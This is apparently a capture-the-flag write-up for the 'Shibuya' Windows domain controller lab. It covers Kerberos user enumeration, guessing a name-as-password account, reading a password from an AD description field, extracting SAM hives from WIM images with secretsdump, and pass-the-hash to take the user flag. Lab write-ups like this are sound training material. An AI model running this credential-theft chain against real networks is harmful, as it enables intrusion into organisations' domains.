## Overview

Shibuya is a Hard-difficulty Windows machine running as a Domain Controller (`shibuya.vl`). With no web server in sight, the path starts at Kerberos: enumerating valid usernames, finding a machine account whose password equals its name (`red:red`), and reading a cleartext password out of an AD user's *Description* field. That account can read a hidden `images$` share full of `.wim` deployment images — and one of them still carries a local SAM database whose `operator` hash is reused by the domain user `simon.watson`. A pass-the-hash gets us in. This post walks recon → foothold → `user.txt`.

## Recon

| Port | Service |
|------|---------|
| 22 | OpenSSH for Windows 9.5 |
| 53 | Simple DNS Plus |
| 88 | Kerberos |
| 135/139/445 | MSRPC / NetBIOS / SMB |
| 464 | kpasswd |
| 593 | RPC over HTTP |
| 3268/3269 | AD LDAP (Global Catalog) |
| 3389 | RDP |
| 9389 | AD Web Services (.NET Message Framing) |

```bash
nmap -p- --min-rate=1000 -T4 10.129.234.42
nmap -p22,53,88,135,139,445,464,593,3268,3269,3389,9389 -sC -sV 10.129.234.42
```

The open Kerberos/LDAP/SMB set screams Domain Controller, and nmap leaks the hostname `AWSJPDC0522.shibuya.vl`. SSH on a Windows box (port 22) is unusual — worth noting for later. Add the host:

```bash
echo "10.129.234.42 AWSJPDC0522.shibuya.vl shibuya.vl" | sudo tee -a /etc/hosts
```

## Enumeration

Null and guest SMB are both denied, so with no credentials the next move is Kerberos username enumeration — the KDC reveals whether an account exists without any login.

```bash
kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Two valid names come back: `red` and `purple`. Accounts often reuse the username as the password — and `red` does (it's a machine/service account):

```bash
nxc smb shibuya.vl -u red -p red -k
```

With a foothold credential, enumerate the domain users and read their attribute fields. The `svc_autojoin` account has what looks like a password sitting in its *Description*:

```bash
nxc smb 10.129.234.42 -u red -p red --users
nxc smb 10.129.234.42 -u svc_autojoin -p '<redacted>'
```

## Foothold

`svc_autojoin` can read a non-standard hidden share, `images$`, containing Windows Imaging Format (`.wim`) deployment images:

```bash
impacket-smbclient -k "shibuya.vl/svc_autojoin:<redacted>@AWSJPDC0522.shibuya.vl"
# use images$ ; mget *
```

WIM files are disk images and frequently still contain the registry hives from the machine they were captured on. Pull the SAM/SYSTEM/SECURITY hives straight out of the image and dump the local hashes offline:

```bash
wimextract AWSJPWK0222-02.wim 1 \
  Windows/System32/config/SAM Windows/System32/config/SYSTEM Windows/System32/config/SECURITY \
  --dest-dir /tmp/wim
impacket-secretsdump -system /tmp/wim/SYSTEM -sam /tmp/wim/SAM -security /tmp/wim/SECURITY local
```

The dump yields a local `operator` NT hash. Password reuse across the local image and the domain means that hash also authenticates the domain user `simon.watson` — no cracking required, just pass-the-hash:

```bash
nxc smb 10.129.234.42 -u simon.watson -H <redacted>
```

That works, so we can read his home directory on the `users` share.

## User flag

```bash
printf 'use users\ncd simon.watson\ncd Desktop\nget user.txt\nexit\n' \
  | impacket-smbclient -hashes :<redacted> 'shibuya.vl/simon.watson@10.129.234.42'
cat user.txt   # HTB{...}
```
